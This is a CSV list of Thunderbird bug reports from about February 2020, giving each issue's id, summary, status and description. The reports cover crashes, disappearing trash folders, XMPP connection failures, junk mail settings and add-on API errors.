Issue id,Summary,Status,Priority,Resolution,Description
1618709,Trash folder often (~1 in 3 times) disappears when emptying trash then cannot delete messages. Restarting Thunderbird fixes until next time.,UNCONFIRMED,--,,"Trash folder often (~1 in 3 times) disappears when emptying trash from file menu, then cannot delete any further messages. Restarting Thunderbird fixes until next time. Similar faults reported in the past (11 years ago) but nothing was done."
1618774,XMPP connection fails after upgrade to 74.0b1,RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: Tried to connect to XMPP server. Setting for encrypted/non-encrypted setting made no difference. Debug log not very informative. No connection logs on the server. Actual results: (Thunderbird 74.0 (20200212221342), Gecko 74.0 (20200212221342) on Intel Mac OS X 10.15) [28/2/20, 4:55:28pm AEST] DEBUG (@ prpl-jabber: connect resource:///modules/socket.jsm:165) Connecting to: chat.xxxx.com.au:5222 Expected results: Connection!"
1618800,thunderbird crash when creating a new message or reply to a message,RESOLVED,--,WORKSFORME,"User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.5 Safari/605.1.15 Steps to reproduce: when trying to create a new message or reply to a message Actual results: thunderbird is crashing without message. No crash report available. Test also in safe mode. Expected results: open a new window for composing message. Version 68.5.0 on OSX Catalina (10.15.3)"
1618927,Won't retain window sizes on monitor on restart,UNCONFIRMED,--,,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18362 Steps to reproduce: Close and restart a few times. I open thunderbird on an external monitor. It does remember which monitor to open on. Actual results: Eventually windows resize themselves. Expected results: Windows should retain the size and position I give them."
1618961,Automatically migrate users off of 32 bit Thunderbird using Help:About,RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0 Steps to reproduce: Go to Help:About Actual results: No update other than 32 bit is offered Expected results: Should ask if you want to update to 64 bit Thunderbird (same version or higher version). As far as I know, this applies to all versions of Thunderbird."
1619046,enable adaptive junk mail controls doesn't stick,RESOLVED,--,DUPLICATE,"Current nightly build on Mac. Reproduced in safe mode. I did not test any other platform. 1. Open account settings 2. click Junk settings 3. ** observe that ""enable adaptive junk mail controls"" box is checked (enabled), AND ""Do not automatically mark ..."" and the address books are greyed out ... as if ""enable adaptive junk mail controls"" is NOT enabled 4. click the checkbox ""enable adaptive junk mail controls"" 5. ** observe that ""enable adaptive junk mail controls"" is still checked - it should have gone unchecked 6. click the checkbox ""enable adaptive junk mail controls"" (this is the second time) 7. ** observe that ""enable adaptive junk mail controls"" is unchecked and the address books are not greyed out 8. click a different setting tab, such as composition 9. click Junk settings Actual results: ""enable adaptive junk mail controls"" is checked (enabled) Expected results: ""enable adaptive junk mail controls"" is unchecked (disabled)"
1619057,Mail Extension compose.onBeforeSend returning a mailing list fails,RESOLVED,--,FIXED,"User Agent: Mozilla/5.0 (X11; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0 Steps to reproduce: As mentioned in topicbox forum: https://thunderbird.topicbox.com/groups/addons/T5d6979f2417f424c-M03013aee0a804913c76604c3/compose-onbeforesend-returned-object-format Summary: Using compose.onBeforeSend, not cancelling the send, and returning a mailing list in the [details] object fails ""syntax error in parameters or arguments"" Screenshot: https://revad.github.io/shared/Change_lint_to_BCC_Screenshot_2020-02-26_13-57-58.png Object returned was New obj:{""details"":{""to"":[],""cc"":[],""bcc"":[""List_of_2_valid <List_of_2_valid>""],""replyTo"":[],""followupTo"":[],""newsgroups"":[],""subject"":""Test 2""},""cancel"":false} It doesn't make any difference whether you move the object to BCC or not. (I also tried returning an object-formatted mailing list - that failed too.) Addon I'm testing: https://github.com/revad/limit_non-BCC_recipients"
1619075,"Right-click ""copy"" image doesn't copy shit",RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 Steps to reproduce: 1. Compose a new HTML message 2. From another application, e.g. GIMP, copy an image 3. Paste it into the message you are composing 4. Make sure the image you copied is no longer in the clipboard by copying and pasting some other image, regardless of whether it's in Thunderbird or outside. 4. Now go back to the message you're composing in Thunderbird. Select an image in your message by clicking on it. Right-click and select ""Copy"" 5. Try to paste it in another application, e.g. GIMP Actual results: Doesn't paste the image I copied from Thunderbird. Instead, it pastes whatever previous image I had copied from somewhere else Expected results: When I right-click on an image in Thunderbird and click Copy I expect the f*****g image to be copied into the f*****g clipboard, just like in every other f*****g application."
1619089,"Random email item unreadable because of scam warning ""add an exception…"" message and a ""Try again""",UNCONFIRMED,--,,"User Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0 Steps to reproduce: This would seem to be in the bug class. Thunderbird 68.5.0 (32-bit) I have two accounts, one Gmail and one from my domain provider. In both cases, I get random emails that cannot be read. Actual results: They have an ""Or you can add an exception…"" message and a ""Try again"" button which has no active function. Nothing can be done except delete. Those same messages are fine when received by my phone, and are ok in TB when I forward them to myself with either account. Expected results: Since this is random (about 1 in 10) it is hard to specifically reproduce, and there is no source that is immune or consistently fails. So, it should not be happening."
1619098,"When opening an attachment of an unknown type, can't chose the ""helper"" application to view it",UNCONFIRMED,--,,"To reproduce: 1. Right-click on an attachment on a received mail 2. Thunderbird proposes to save the file, or to open it with a ""helper"" application 3. There is a short list of default helper application plus a choice ""Other"" 4. However, even the ""Other"" / ""View All Appliations"" choice just pops up another still limited list of predefined applications. There is no way to enter my own application (in my case, emacsclient, to view .patch files). This used to work in older versions of Thunderbird even if it clumsily. Unfortunately, I don't remember exactly when this possibility disappeared."
1619136,Disk space local imap folder compared to online version,RESOLVED,--,INCOMPLETE,"User Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0 Steps to reproduce: Compare the offline imap folder size to that of the online one. The imap folder is connected to gmail and I've compression turned on in Thunderbird. Actual results: The online (gmail) uses 3.7GB whereas my Thunderbird imap folder is 8.1GB large. Expected results: The folder sizes were expected to be comparable. Of course, a Thunderbird and Google might use different methods to store/compress data but this does not justify this large of a difference. It should be noted that the '[Gmail].sbd/Alle e-mail' (all e-mail) file is 2.4GB and my 'INBOX' file is 2.7GB. These are (by far) using the most disk space of all files. I found some information online but they seem to be (very) outdated: - http://forums.mozillazine.org/viewtopic.php?f=39&t=2978753 (2015) - http://kb.mozillazine.org/Minimize_the_size_of_a_profile (year unknown) - https://bugzilla.mozilla.org/show_bug.cgi?id=721316#c13 (2012) As all my accounts are based on gmail I cannot verify whether the issue is in the way that thunderbirds create folders or if it is an IMAP or a google related problem. (for now, I reported th"
1619155,Adding photo to contact fails,RESOLVED,--,FIXED,"Adding a photo to a contact not seem to work at all. Seen on 75.0a1 (2020-02-27) (64-bit). I'm aware that this is filed against the current (alias ""old"") AB, but then, we are not sure how many more years to wait for the new AB, and in the meantime, maybe things should not be totally broken like this. STR 1) In main address book, select ""Personal Address Book"" (bypass potential problems of ""All Address books"") 2) New Contact (from AB toolbar), optionally fill name and email, optionally create the contact first and re-edit contact 3) From contact's photo tab, try adding a photo using any of the 3 methods provided. Actual result: - checking radio box before adding photo fails, jumps back to ""Generic photo"" - With Browse for Local file (On this computer), file name gets added, unreadable bc file icon gets repeated in the background of the input box (see screenshot), radio state doesn't update, photo does not appear (I tried a regular .jpg file which displays correctly elsewhere) - Same for ""On the Web"" - nothing - Same for Drag and drop - nothing Aceman, any ideas/comments?"
